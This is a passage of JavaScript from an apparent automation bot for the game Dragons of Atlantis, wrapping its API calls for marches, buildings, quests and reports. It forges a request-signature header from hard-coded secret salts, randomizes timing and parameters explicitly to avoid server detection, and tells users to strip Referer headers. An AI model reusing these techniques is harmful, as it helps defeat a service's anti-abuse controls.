					// Fix progress bar steps & time to initialize the cities
					StepTimeBar.steps += Seed.city_init.length - 1 ;
					StepTimeBar.delay = Seed.city_init.length * 6000;
					StepTimeBar.update ( current_step - 1 );

					message = 'Capital Successfully initialised';
					Seed.fetchCity ({
						city_id   : city_id,
						from_init : true,
						onSuccess : function ( r ) {
						
							// Init Resources tick
							Resources.init();
      	
							wait_time = Math.randRange(5000,7000);
						
							onSuccess ( r );
						},
						onFailure : onFailure,
						delay  : 250,
						caller : 'scriptStartUp'
					});
					break;
					
				/**  Seed Check Outpost Cities
				***************************************/
				case 7:
				
					var nb_loaded = 0;
					for ( var i=0; i < Seed.city_init.length; i++ )
					{
						if ( Seed.city_init[i].loaded ) {
							nb_loaded ++;
						}
					}
					for ( var i=0; i < Seed.city_init.length; i++ )
					{
						if ( Seed.city_init[i].loaded || Seed.city_init[i].type == 'capital' ) {
							continue;
						}
						
						if ( Seed.city_init[i].timer ) {
							clearTimeout( Seed.city_init[i].timer );
						}
						
						var current_index = i;
						
						$startUpBox.find('span').html(translate('Charging') + ' ' + translate(Seed.city_init[i].name) + '...');
						
						var city_id = Seed.city_init[i].id;
						
						// Fix progress bar total time to initialize the cities
						StepTimeBar.delay += 7000;

						Seed.fetchCity ({
							city_id   : city_id,
							from_init : true,
							onSuccess : function ( r ) {
	    	
								verboseLog ( 'Outpost '+ city_id +' Successfully initialised' );
								console.log('Outpost '+ Seed.cities[Seed.city_idx[city_id]].name +' Successfully initialised' );

								wait_time = Math.randRange(5000,7000);
							
								if ( current_index == Seed.city_init.length - 1 ){
									wait_time = 1500;
								}
      	
								StepTimeBar.update ( current_step + nb_loaded );
								
								// Waiting time increases three times to prevent detection of the server
								STARTUP_TIMER = setTimeout( stepStarting, wait_time, current_step,0);
							},
							onFailure : onFailure,
							delay  : 250,
							caller : 'scriptStartUp'
						});
						
						return;
					}
					
					StepTimeBar.stop();
					startPowerTools();
					//updateChecker(); // Didi : for the moment : desactivate
					return;
					break;
				}
			}
			else 
			{
				// Retries Limit
				$startUpBox.title( FATAL_SEED_TITLE );
				$startUpBox.html( FATAL_SEED_MSG + '<br><br>' + error_msg );
				return;
			}

		}
		
		stepStarting( 1 );
				
		/**  startPowerTools
		***************************************/
		function startPowerTools()
		{
			$startUpBox.destroy ();
			
			TIME_FORMAT_DHMS = [translate('d'),translate('h'),translate('m'),translate('s')];
						
			// Initialization
			AutoCollect.init ();
			AutoRefresh.init();
			Map.init ();
			Marches.init ();
			Messages.init ();
			Dragons.init ();
		
			// Create a new popup DIV for the main script window
			var width = Math.randRange(495, 500);
			if ( Data.options.main_box.x < 1 ) 
			{
				Data.options.main_box.x = parseInt( document.body.offsetWidth - ( document.body.offsetWidth - 760 ) / 2 - width / 2) ;
			}
			
			var $main_box = dialogBox({
				id			: setUID('dialog-main-box'),
				dialogClass	: UID['main-box'],
				position	: [Data.options.main_box.x, Data.options.main_box.y],
				width		: width,
				height		: Math.randRange(830, 835),
				draggable	: Data.options.main_box.draggable,
				title		: 'v' + SCRIPT_VERSION + ' (' + API_VERSION + ')', //Didi
				buttons		: {},
				close		: function (){
								TabsManager.hideTab();
							},
				dragStop	: function ( event, ui ) {
								var offset = $J( event.target ).offset();
								//Data.options.main_box.x = document.body.offsetWidth - offset.left - $J(event.target).outerWidth();
								Data.options.main_box.x = offset.left;
								Data.options.main_box.y = offset.top-24;
							}
			});
			
			// Create all the tabs and insert them into the main Popup
			TabsManager.init( $main_box );
			TabsManager.showTab();
			TabsManager.showTitle();
			
			Sound.init();
			Sentinel.init();

			// Start event listeners to look for an unload event from Data Storage			
			window.addEventListener( 'unload', Data.onUnload, false );
			
			
			// HotKeys
			// Debug Mode (Ctrl + Alt + Shift + D)
			shortcut.add('Ctrl+Alt+Shift+D', function(event){
				Data.options.debug_mode = !Data.options.debug_mode;
				DEBUG_MODE = DEBUG_MARCHES = Data.options.debug_mode;
				Tabs.Logs.tabDebugToggle();
				//Tabs.Logs.$container.toggle();
				$J.msg({ 
					content : '<center>'
							+'Debug Mode :' 
							+ ( Data.options.debug_mode ? 'ENABLED' : 'DISABLED' )
							+ '<br><br>'
							+ 'You need to restart the script <br> to display the Debug tab'
							+ '</center>',
					timeOut	: 'words', /* Words per minute*/
					target	: $main_box
				});
			});

			actionLog ( SCRIPT_VERSION + ' ' +translate('Loaded') );
			verboseLog( SCRIPT_VERSION + ' Loaded' );
		
			WackoScript.init();
		}
	} catch (e) {
		$startUpBox.title( 'ERROR!' );
		$startUpBox.html( INIT_ERROR +'<br><br>' + e + ' line: '+ e.lineNumber );
		debugLog( inspect (e, 8, 1) );
	}  
}




MyAjax = {
	/*
		options 
		{
			url:
			method:
			params:
			
			callback:
			   or
			onSuccess:
			onFailure:
			
			delay:
			timeout:
			next_delay:
		}
	*/
	RequestDOA : function ( options )
	{
		if ( !options.params ) {
			options.params = {};
		}
		if (typeof options.nonapi == 'undefined') {
			options.nonapi = false;
		}
		
		// Commons params (don't add in case of xml locale )
		if ( !options.nonapi ) {
			options.params['user_id']		= USER_ID;
			options.params['_session_id']	= SESSION_ID;
			options.params['version']		= API_VERSION;
			options.params['dragon_heart']	= DRAGON_HEART;
			options.params['timestamp']		= parseInt( serverTime() );
		}
		
		Queue.add({
			fn	 : MyAjax.Request ,
			args : [{
				url          : ( (options.url.toLowerCase().indexOf('http') == -1) ? API_SERVER + '/' + options.url : options.url) ,
				useSignature : (options.method.toUpperCase() === 'POST'),
				method		 : options.method.toUpperCase(),
				params		 : options.params,
				binary		 : options.binary,
				nonapi     : options.nonapi,
				timeoutSecs	 : 45,
				
				onSuccess	 : function( r )
				{
					if ( r.status === 200 && r.responseText )
					{
						if ( options.nonapi )
						{
							if ( options.onSuccess ) {
								options.onSuccess ( r.responseText );
							}
							else if ( options.callback ) {
								options.callback({
									ok  : true, 
									dat : r.responseText
								});
							}
						} 
						else {
							var data;
							try {
								data = JSON.parse( r.responseText );
							} catch (e) { console.log ('ERROR: MyAjax.RequestDOA.onSuccess JSON.parse: ' + e) }
							
							if ( options.onSuccess ) {
								options.onSuccess ( data );
							}
							else if ( options.callback ) {
								options.callback({
									ok  : true, 
									dat : data
								});
							}
						}
					} 
					else {
						if ( options.onFailure ) {
								options.onFailure ({
									errmsg:'The request was successful but no data was returned'
								});
						}
						else if ( options.callback ) {
							options.callback({
								ok     : false, 
								errmsg : 'The request was successful but no data was returned'
							});
						}
					}
				},
			
				onFailure	 : function( r )
				{
					var res = {
						ok		: false,
						status	: r.status,
						errmsg	: r.statusText,
					};
					
					if ( r.responseText ) {
						res.dat = r.responseText;
					}
					else if ( !r.status ) {
						res.errmsg = 'This browser is not compatible at this time';
					}
					
					if ( options.onFailure ) {
						options.onFailure( res );
					}
					else if ( options.callback ) {
						options.callback ( res );
					}
				},
				
				on403 : function(r) 
				{
					dialogError('<b>' + FATAL_SEED_TITLE + '</b>'
						+'<br><br>'
						+'<font color="#C00"><b> ' + r.statusText + '</b></font>'
						+'<br><br>'
						+'<b>Previous Requirements</b><br>'
						+'<b>FIREFOX</b>'
						+'<ul>'
						+'<li>Download and install <a href="https://addons.mozilla.org/es-ES/firefox/addon/refcontrol/">RefControl</a></li>'
						+'<li>Once installed click Tools - RefControlOptions</li>'
						+'<li>Click Add Site and type in wonderhill.com</li>'
						+'<li>Check the Block - Send no referer radio box</li>'
						+'<li>Click OK and then OK again</li>'
						+'</ul>'
						+'<br>'
						+'<b>CHROME</b>'
						+'<ul>'
						+'<li>Right click on your "Chrome" icon (either on your Desktop or your Taskbar)</li>'
						+'<li>Choose properties</li>'
						+'<li>At the end of your target line, place these parameters: --no-referrers</li>'
						+'<li>Click OK</li>'
						+'</ul>'
						+'<br><br>'
						+'<a id="' + UID['support_link'] + '" href="http://www.facebook.com/groups/DoAscripts/" target="_blank">Facebook page for support!</a><br>'
						+'<br>');
				},
				
				
				on429 : function( r )
				{
				/*
					dialogError('<b>ERROR 429</b><br><br>\
						<div style="text-align:center;">\
						<span style="color:#C00;font-size:12pt;"><b>API Bandwidth Limit Exceeded</b></span><br><br>\
						<b>This account maybe has been blocked momentarily.<br>\
						<br>TRY AGAIN LATER</b>\
						</div>');
				*/
				},
				

				on509 : function( r )
				{
				/*
					dialogError('<b>ERROR 509</b><br><br>\
						<div style="text-align:center;">\
						<span style="color:#C00;font-size:12pt;"><b>Bandwidth Limit Exceeded</b></span><br><br>\
						<b>This account maybe has been blocked momentarily.<br>\
						<br>TRY AGAIN LATER</b>\
						</div>');
				*/
				}

			}],
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller  || '.unknow')
		});
	},
	
	/*
		options:
		{
			url:
			method:
			params:
			useSignature:
			timeoutSecs:
			onSuccess:
			onFailure:
			
		}
	*/
	Request : function ( options )
	{
		var request, params, headers = {}, timeout, h , overrideMimeType;
		
		//prepare params 
		// Parse request parameters
		params = typeof options.params === 'string' ? options.params : Object.toQueryString( shuffleProperties( options.params ) ).replace(/\_/g,'%5F').replace(/\(/g,'%28').replace(/\)/g,'%29');

		//prepare headers 
		// Change Accept request header based on browser
		headers['Accept'] =  IS_CHROME ? '*/*' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,*/*;q=0.6,*/*;q=0.4';
		
		// Add request header specific to POST request only
		if ( !options.nonapi && options.useSignature )
		{
			// The browser does not allow this action, but it would be able to do it,
			// because the game send this Origin Header
			
			// headers['Origin'] = S3_SERVER;
			
			headers['x-s3-aws'] = SHA1( 'Draoumculiasis' + params + 'LandCrocodile' + options.url  + 'Bevar-Asp' );
			headers['content-type'] = 'application/x-www-form-urlencoded';
		} 
		
		// change content-type and mime type if binary function
		if ( options.nonapi && options.binary ) {
			headers['content-type'] =  'text/plain; charset=x-user-defined';
			overrideMimeType = 'text/plain; charset=x-user-defined';
		}
		// Merge headers with option.headers
		//$J.extend(headers, options.headers || { });
		
		//add params to url 		
		if ( options.method === 'GET' && params.length > 0) {
			options.url += ( options.url.include('?') ? '&' : '?' ) + params;
		}

		var isGM = typeof GM_info === 'object' && typeof GM_info.version === 'string' && typeof GM_getValue != 'undefined' && typeof GM_getValue('a', 'b') != 'undefined';
		//logit('isGM='+isGM+';'+'GM_xmlhttpRequest='+(typeof GM_xmlhttpRequest));

		if ( typeof GM_xmlhttpRequest === 'function' && isGM ) {
			GM_xmlhttpRequest({
  			method: options.method,
  			url: options.url,
  			data: ( options.method === 'POST' ? params : null ),
  			headers: headers,
  			overrideMimeType : overrideMimeType,
  			ontimeout : ( options.timeoutSecs ? options.timeoutSecs*1000 : 0 ),
  			onreadystatechange: function (resp) {
					if ( resp.readyState === 4 )
					{
						if (!resp.status || resp.status != 200)
						{
							var resp_to_display = resp.cloneProps();
							delete resp_to_display.responseText;
							logit('resp for readyState = 4 : '+inspect(resp_to_display,8,1));
						}
						clearTimeout( timeout );
						var response = {
							responseText	: resp.responseText,
							status			: resp.status,
							statusText		: resp.statusText,
							request			: resp
						}
						if ( ( resp.status >= 200 && resp.status < 300 ) || resp.status === 304 )
						{
							if ( options.onSuccess ) {
								options.onSuccess( response );
							}
						} 
						else {
							if ( options.onFailure ) {
								console.log(options.url+' fail : '+inspect(response,8,1)+'\ncaller='+options.caller);
								options.onFailure( response );
							}
							if ( options['on' + resp.status] ) {
								options['on' + resp.status]( response );
							}
						}
					} 
				}
			});
		} else {
			request = new XMLHttpRequest();
			request.onreadystatechange = function(){
				if ( request.readyState === 4 )
				{
					if (!request.status || request.status != 200)
					{
					var resp_to_display = request.cloneProps();
					delete resp_to_display.responseText;
					logit('resp for readyState = 4 : '+inspect(resp_to_display,8,1));
					}
					clearTimeout( timeout );
					var response = {
						responseText	: request.responseText,
						status			: request.status,
						statusText		: request.statusText,
						request			: request
					}
					if ( ( request.status >= 200 && request.status < 300 ) || request.status === 304 )
					{
						if ( options.onSuccess ) {
							options.onSuccess( response );
						}
					} 
					else {
						if ( options.onFailure ) {
							console.log(options.url+' fail : '+inspect(response,8,1)+'\ncaller='+options.caller);
							options.onFailure( response );
						}
						if ( options['on' + request.status] ) {
							options['on' + request.status]( response );
						}
					}
				} 
			};
			
			// Open Request
			request.open( options.method, options.url, true );
			
			// Add request headers to ajax request
			for ( h in headers ) {
				request.setRequestHeader( h, headers[h] );
			}
			
			if ( overrideMimeType ) {
				request.overrideMimeType(overrideMimeType);
			}

			
			// Start timeout check before request is sent
			if ( options.timeoutSecs )
			{
				timeout = setTimeout( function() {
					request.abort();
					// CHECK: 599 is custom error code. See if better option exists.
					if ( options.onFailure )
					{
						options.onFailure({
							responseText	: null,
							status			: 599,
							statusText		: 'Request Timed Out',
							request			: request
						});
					}
				}, options.timeoutSecs*1000);
			}
			
			// Send request with params if POST otherwise just send request
			request.send( options.method === 'POST' ? params : null );
		}
	},
	
		/*
		options
		{
			city_id:
			x:
			y:
			callback:
		}
	*/
	abandon : function ( options )
	{
		var p = {};
		p['_method']	= 'delete';
		p['x']			= options.x;
		p['y']			= options.y;
		
		var url 	= 'cities/'+ options.city_id +'/wildernesses/abandon.json';
		var method	= 'POST';
		
		Data.requests.abandon.total++;
		
		new MyAjax.RequestDOA ({
			url		: url,
			method	: method,
			params	: p,
			
			onSuccess : function( r ) {

				if ( r.result.city ) {
					Seed.updateCity ( r.result.city );
				}
				
				if ( r.result.errors || !r.result.success ) {
					Data.requests.abandon.errors++;
					r.errmsg = r.result.errors[0];
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				
				
				Map.tileAt ({
					x         : options.x,
					y         : options.y,
					onSuccess : function(){},
					onFailure : function(){},
					caller    : 'MyAjax.abandon'
				});
				
				if ( options.onSuccess ){
					options.onSuccess( r.result );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				Data.requests.abandon.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.abandon'
		});
	},
	
	
	
	// Use a json to wrap the building upgrade job
	/*
		options
		{
			city_id:
			building_id:	( for upgrades case )
			building_type:	( for init build case )
			slot:			( for init build case )
			callback:
		}
	*/
	buildings : function ( options )
	{
		var url, p = {};
		
		if ( options.building_id ) 
		{
			p['_method']	= 'put';
			
			url	= 'cities/' + options.city_id + '/buildings/' + options.building_id + '.json';
		}
		else {
			p['city_building[building_type]']	= options.building_type;
			p['city_building[slot]']			= options.slot;
			
			url	= 'cities/' + options.city_id + '/buildings.json';
		}
		
		var method	= 'POST';
		
		Data.requests.building.total++;
		
		new MyAjax.RequestDOA ({
			url       : url,
			method    : method,
			params    : p,
			onSuccess : function( r ) {
				if ( r.result && r.result.success ) {
					
					Seed.checkAddJob ( r.result.job );
					
					if ( options.onSuccess ){
						options.onSuccess( r.result );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
				}
				else {
					Data.requests.building.errors++;
					r.errmsg = r.result.errors[0];
					if ( options.onFailure ){
						options.onFailure( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
				}
			},
			onFailure : function( r ){
				Data.requests.building.errors++;
				if ( options.onFailure ){
					options.onFailure( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.buildings'
		});
	},
	
	/*
		options
		{
			quest_name :
			callback   :
		}
	*/
	claim : function ( options )
	{
		var t = MyAjax;
		
		var p = {};
		p['_method']	  = 'put';
		p['quest_name']	  = options.quest_name;
		
		var url 	= 'player_quests/claim.json';
		var method	= 'POST';
		
		Data.requests.claim.total++;
		
		new MyAjax.RequestDOA ({
			url		: url,
			method	: method,
			params	: p,
			
			onSuccess : function( r ) {
				if ( r.result.errors || !r.result.success ) {
					Data.requests.claim.errors++;
					r.errmsg = r.result.errors[0];
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				
				if (r.quests.claimed) { 
					Seed.player.quests.claimed = r.quests.claimed.cloneProps();
				}
				if (r.result.items) {
					Seed.player.items = r.result.items.cloneProps();
				}
				
				if ( options.onSuccess ){
					options.onSuccess( r.result );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				Data.requests.claim.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.claim'
		});
	},
	
	/*
		options
		{
			city_id:
			defended:
			callback:
		}
	*/
	defendedCity : function ( options )
	{
		var p = {};
		p['_method']	= 'put';
		p['defended']	= options.defended ? '1' : '0';

		var url 	= 'cities/'+ options.city_id +'.json';
		var method	= 'POST';
		
		Data.requests.defended.total++;
		
		new MyAjax.RequestDOA ({
			url       : url,
			method    : method,
			params    : p,
			onSuccess : function( r ) {
				//logit('defendedCity return='+inspect(r,8,1));
				if ( r.errors ) {
					Data.requests.defended.errors++;
					r.errmsg = r.errors;
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}

				Seed.updateCity ( r.city );

				if ( options.onSuccess ) {
					options.onSuccess ( );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			onFailure : function ( r ) {
				Data.requests.defended.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.defendedCity'
		});
	},
	
	/*
		options
		{
			city_id:
			units:
		}
	*/
	defense_troop : function ( options )
	{

		function removeEmpty ( obj ) {
			for ( var key in obj )
			{
				if ( obj[key] == 0 ){
					delete obj[key];
				}
			}
			return obj;
		}

		if ( options.units ) {
			options.units = removeEmpty(options.units);
		}
		
		var p = {};
		p['_method']	= 'put';
		p['defense_force[units]']	= JSON.stringify(options.units);

		var url 	= 'cities/'+ options.city_id + '/defense_force.json';
		var method	= 'POST';
		
		Data.requests.defense.total++;
		
		new MyAjax.RequestDOA ({
			url       : url,
			method    : method,
			params    : p,
			onSuccess : function( r ) {

				if ( r.result.city ) {
					Seed.updateCity ( r.result.city );
				}
				
				//logit('defense_troop return='+inspect(r,8,1));
				if ( r.errors || !r.result.success ) {
					Data.requests.defense.errors++;
					r.errmsg = r.errors || r.result.reason;
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}

				if ( options.onSuccess ) {
					options.onSuccess ( );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			onFailure : function ( r ) {
				Data.requests.defense.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.defense_troop'
		});
	},
	
	/*
		options
		{
			item_type :
			job_id    :
			callback  :
		}
	*/
	items : function ( options )
	{
		var p = {}
		p['_method']	= 'delete';
		p['job_id']		= options.job_id;
	
		var url 	= 'player_items/'+ options.item_type + '.json';
		var method	= 'POST';
		
		Data.requests.items.total++;
		
		new MyAjax.RequestDOA ({
			url       : url,
			method    : method,
			params    : p,
			
			onSuccess : function( r ) {
				if ( r.result.errors || !r.result.success ) {
					Data.requests.items.errors++;
					if ( options.onFailure ) {
						options.onFailure ( null );
					}
					else if ( options.callback ) {
						options.callback ( null );
					}
					return;
				}
				
				if (r.result.items) {
					Seed.player.items = r.result.items.cloneProps();
				}
				
				if ( options.onSuccess ){
					options.onSuccess( r.result );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				Data.requests.items.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.items'
		});
	},
	
	/*
		options
		{
			city_id:
			x:
			y:
			general_id:  (only used for Attack)
			units:
			resources:   (only used for TransportMarch)
			owner_id:
			callback:
		}
	*/
	// now includes the ability to be used to send spies or resources
	marches : function ( options )
	{
		var t = MyAjax;

		if ( typeof options.x == 'undefined' || typeof options.y == 'undefined' ) {
			debugLog('Missing some option when call MyAjax.march' + inspect(options,4,0));
			return;
		}
		
		// We remove the units with zero troops, 
		// if we don't do this, the script sends the request of that unit with value zero,
		// and that is wrong.
		function removeEmpty ( obj ) {
			for ( var key in obj )
			{
				if ( obj[key] == 0 ){
					delete obj[key];
				}
			}
			return obj;
		}
		if ( options.resources ) {
			options.resources = removeEmpty(options.resources);
		}
		if ( options.units ) {
			options.units = removeEmpty(options.units);
		}
		
		
		// Detects and configures the type of march based on the options
		var march_type;
		// if we set a resources is a transport march
		if ( options.resources ) {
			march_type = 'TransportMarch';
		} 
		// if we set a general_id and units is an attack march
		else if ( options.general_id && options.units ) {
			march_type = 'attack';
		}
		// if we set a units.spy is an spy march
		else if ( options.units  && options.units.spy ) {
			march_type = 'spy';
		}
		// ok, something is wrong
		else {
			debugLog( 'ERROR: MyAjax.marches : ' + JSON.stringify(options) );
			if ( options.onFailure ){
				options.onFailure( { errmsg : 'Failed to send March: need to set some value' } );
			}
			return;
		}
		//logit('march_type='+march_type);
		//logit('options.general_id='+options.general_id);
		//logit('options.units='+inspect(options.units,8,1));
		//logit(options.general_id && options.units);
		
		// Initialise POST data
		var p = {};
		p['_method']			= 'post';
		if (march_type == 'TransportMarch') {
			p['march[type]']	= march_type;
		} else {
			p['march[march_type]']	= march_type;
		}
		p['march[x]']			= options.x;
		p['march[y]']			= options.y;
		
		if ( options.resources ) {
			p['march[resources]']	= JSON.stringify( options.resources );
		}
		if ( options.units ) {
			p['march[units]']		= JSON.stringify( options.units );
		}
		if ( options.general_id ) {
			p['march[general_id]']	= options.general_id;
		}
		
		var url 	= 'cities/'+ options.city_id +'/marches.json';
		var method	= 'POST';
		
		Data.requests.marches.total++;
		
		// Send request
		new MyAjax.RequestDOA ({
			url       : url,
			method    : method,
			params    : p,
			
			onSuccess : function( r ) {

				if ( r.result.city ) {
					//logit('marches send updateCity');
					Seed.updateCity ( r.result.city );
				} else {
					//logit('marches without result.city');
				}
				
				if ( r.errors || !r.result.success ) 
				{
					Data.requests.marches.errors++;
					r.errmsg = r.errors || r.result.reason;
					
					if ( options.onFailure ){
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}

				try {
					Seed.marches[r.result.job.march_id].owner_id = options.owner_id;
					Seed.marches[r.result.job.march_id].origin = 'tools';
				} catch (e) {
					console.log ('MyAjax.marches.RequestDOA.onSuccess : ' + e);
					debugLog ('***********'+ e);
				}
				
				if ( options.onSuccess ){
					options.onSuccess( r.result );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
				
			},
			
			onFailure: function( r ) {
				
				Data.requests.marches.errors++;
				
				if ( options.onFailure ){
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.marches'
		});
	},

	/*
		options
		{
			city_id:
			march_id:
			callback:
		}
	*/
	marchesRecall : function ( options ) {
		var t = MyAjax;
		
		if ( !Seed.marches[options.march_id] ) return;
		
		var p = {};
		p['_method'] = 'delete';
		
		var url 	= 'cities/'+ options.city_id +'/marches/'+ options.march_id +'.json';
		var method	= 'POST';
		
		Data.requests.recalls.total++;
		
		new MyAjax.RequestDOA ({
			url       : url,
			method    : method,
			params    : p,
			onSuccess : function( r ) {
				
				if ( r.result.city ) {
					Seed.updateCity ( r.result.city );
				}
				
				if ( r.errors || !r.result.success ) 
				{
					Data.requests.recalls.errors++;
					r.errmsg = r.errors || r.result.reason;
					
					if ( options.onFailure ){
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
								
				if ( options.onSuccess ){
					options.onSuccess( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function( r ) {
				Data.requests.recalls.errors++;
				if ( options.onFailure ){
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.marchesRecall'
		});
	},
	
	/*
		options
		{
			city_id:
			callback:
		}
	*/
	moveResources : function ( options )
	{
		var p = {};

		var url 	= 'cities/'+ options.city_id +'/move_resources.json';
		var method	= 'POST';
		
		Data.requests.collect.total++;
		
		new MyAjax.RequestDOA ({
			url		: url,
			method	: method,
			params	: p,
			
			onSuccess: function( r ) {
				logit('moveResources return='+inspect(r,8,1));
				if ( r.errors ) {
					verboseLog('<b>Auto-Collect</b> Error: ' + r.msg);
					Data.requests.building.errors++;
					r.errmsg = r.errors[0];
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				
				Seed.updateCity ( r.city );
				
				if ( options.onSuccess ) {
					options.onSuccess ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure: function( r ) {
				Data.requests.building.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.moveResources'
		});
	},
	
	/*
		options
		{
			category:
			callback:
		}
	*/
	reports : function ( options )
	{
		var p = {}
		p['category']	= options.category || 'all';
		p['page']		= 1;
		p['count']		= 12;
		
		var url 	= 'reports.json';
		var method	= 'GET';
		
		Data.requests.reports.total++;
		
		new MyAjax.RequestDOA ({
			url		: url,
			method	: method,
			params	: p,
			
			onSuccess : function( r ) {
				if ( r.result.errors || !r.result.success ) {
					Data.requests.reports.errors++;
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				if ( options.onSuccess ){
					options.onSuccess( r.result.report_notifications );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				Data.requests.reports.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.messsageList'
		});
	},
	
	/*
		options
		{
			ids:
			callback:
		}
	*/
	reportsDelete : function ( options )
	{
		var p = {}
		p['_method']		= 'delete';
		p['ids']			= options.ids.join('|');
		
		var url 	= 'reports/bulk_delete.json';
		var method	= 'POST';
		
		Data.requests.reports_del.total++;
		
		new MyAjax.RequestDOA ({
			url       : url,
			method    : method,
			params    : p,
			
			onSuccess : function( r ) {
				if ( r.result.errors || !r.result.success ) {
					Data.requests.reports_del.errors++;
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				} 
				if ( options.onSuccess ){
					options.onSuccess( r.result );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				Data.requests.reports_del.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.reportsDelete'
		});
	},

	/*
		options
		{
			report_id:
			callback:
		}
	*/
	reportsRead : function ( options )
	{
		var p = {}
		
		var url 	= 'reports/'+ options.report_id +'.json';
		var method	= 'GET';
		
		Data.requests.reports_read.total++;
		
		new MyAjax.RequestDOA ({
			url		: url,
			method	: method,
			params	: p,
			
			onSuccess : function( r ) {
				if ( r.result.errors || !r.result.success ) {
					Data.requests.reports_read.errors++;
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				if ( options.onSuccess ){
					options.onSuccess( r.result );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			onFailure : function ( r ) {
				Data.requests.reports_read.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			callback   : options.callback,
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', MyAjax.reportsRead'
		});
	},
	

	/*
		options
		{
			member_id :
			report_id:
			callback:
		}
	*/
	alliancereportsRead : function ( options )
	{
		var p = {}
		
